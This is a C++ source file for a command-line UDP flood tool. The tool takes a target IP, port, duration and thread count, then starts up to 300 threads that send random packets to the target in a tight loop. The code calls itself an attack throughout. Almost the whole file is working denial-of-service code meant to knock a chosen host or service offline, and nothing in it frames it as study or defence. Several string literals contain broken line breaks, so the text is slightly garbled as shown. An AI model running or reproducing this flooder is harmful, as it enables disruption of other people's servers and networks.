#include <iostream>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <pthread.h>
#include <ctime>
#include <csignal>
#include <vector>
#include <memory>
#include <atomic>

#ifdef WIN32
#include <windows.h>
void usleep(int duration) { Sleep(duration); }
#else
#include <unistd.h>
#endif

#define PAYLOAD_SIZE 25

std::atomic<bool> running(true);

class Attack {
public:
    Attack(const std::string& ip, int port, int duration)
        : ip(ip), port(port), duration(duration) {}

    void generatePayload(char* buffer, size_t size) {
        const char* hex1 = "0123456789abcdef";
        const char* hex2 = "0123456789abcdef";
        for (size_t i = 0; i < size; i += 4) {
            buffer[i] = 4;
            buffer[i + 1] = 'x';
            buffer[i + 2] = hex1[rand() % 16];
            buffer[i + 3] = hex2[rand() % 16];
        }
    }

    static void* attackThread(void* arg) {
        Attack* self = static_cast<Attack*>(arg);
        self->runAttack();
        return nullptr;
    }

    void runAttack() {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) {
            perror("Socket creation failed");
            return;
        }

        sockaddr_in serverAddr{};
        memset(&serverAddr, 0, sizeof(serverAddr));
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(port);
        inet_pton(AF_INET, ip.c_str(), &serverAddr.sin_addr);

        time_t endTime = time(nullptr) + duration;
        char payload[PAYLOAD_SIZE];
        generatePayload(payload, PAYLOAD_SIZE);

        while (running && time(nullptr) < endTime) {
            ssize_t sent = sendto(sock, payload, PAYLOAD_SIZE, 0, 
                (struct sockaddr*)&serverAddr, sizeof(serverAddr));
            if (sent < 0) {
                perror("Send failed");
                break;
            }
        }

        close(sock);
    }

private:
    std::string ip;
    int port;
    int duration;
};

void signalHandler(int signum) {
    std::cout << "
Interrupt signal (" << signum << ") received. Stopping attack...
";
    running = false;
}

void usage() {
    std::cout << "Usage: ./ravi <IP> <PORT> <DURATION> <THREADS>
";
    exit(1);
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        usage();
    }

    std::string ip = argv[1];
    int port = std::atoi(argv[2]);
    int duration = std::atoi(argv[3]);
    int threads = std::atoi(argv[4]);

    if (port <= 0 || duration <= 0 || threads <= 0) {
        usage();
    }

    const int MAX_THREADS = 300; 
    if (threads > MAX_THREADS) {
        std::cout << "Thread count too high, limiting to " << MAX_THREADS << "
";
        threads = MAX_THREADS;
    }

    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);

    srand(time(nullptr));

    std::vector<pthread_t> threadIds(threads);
    std::vector<std::unique_ptr<Attack>> attacks;

    for (int i = 0; i < threads; i++) {
        attacks.push_back(std::make_unique<Attack>(ip, port, duration));
        if (pthread_create(&threadIds[i], nullptr, Attack::attackThread, attacks[i].get()) != 0) {
            perror("Thread creation failed");
            running = false;
            break;
        }
        std::cout << "Launched thread " << i+1 << "
";
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(threadIds[i], nullptr);
    }

    std::cout << "Attack finished. Exiting.
";

    return 0;
}